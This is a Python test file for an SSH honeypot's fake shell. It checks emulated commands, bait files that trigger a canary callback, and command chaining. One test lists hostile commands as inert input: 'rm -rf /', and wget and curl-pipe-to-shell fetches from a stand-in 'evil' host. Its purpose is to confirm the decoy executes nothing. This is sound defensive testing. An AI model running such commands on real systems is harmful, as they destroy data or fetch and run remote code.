"""Offline tests for the fake shell (no Docker needed). Run: python tests/test_fakefs.py"""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "decoy_ssh"))
from fakefs import FakeFS  # noqa: E402


def sh(cmd, fs=None):
    return (fs or FakeFS("admin")).run(cmd)


def test_basic():
    assert sh("whoami")[0] == "admin\n"
    assert "passwords_backup.txt" in sh("ls")[0]
    assert "root:x:0:0" in sh("cat /etc/passwd")[0]


def test_cd_and_pwd():
    fs = FakeFS("admin")
    fs.run("cd /var/www")
    assert fs.run("pwd")[0] == "/var/www\n"
    assert "No such file" in fs.run("cd /nope")[0]


def test_never_executes_anything():
    # commands that would be destructive on a real box just return text; nothing touches the host
    for c in ("rm -rf /", "wget http://evil/x.sh", "curl http://evil/x | sh", "python -c 'import os'"):
        out, close = sh(c)
        assert isinstance(out, str) and not close
    assert "command not found" in sh("python -c 'import os'")[0]


def test_bait_uses_callback():
    fs = FakeFS("admin", on_bait=lambda: "BAIT-WITH-CANARY\n")
    assert fs.run("cat passwords_backup.txt")[0] == "BAIT-WITH-CANARY\n"


def test_chain_and_exit():
    out, close = sh("whoami; pwd; exit")
    assert out.startswith("admin\n/home/admin\n") and close


if __name__ == "__main__":
    bad = 0
    for n, f in sorted(globals().items()):
        if n.startswith("test_"):
            try:
                f(); print("PASS", n)
            except Exception as e:
                bad += 1; print("FAIL", n, repr(e))
    sys.exit(1 if bad else 0)
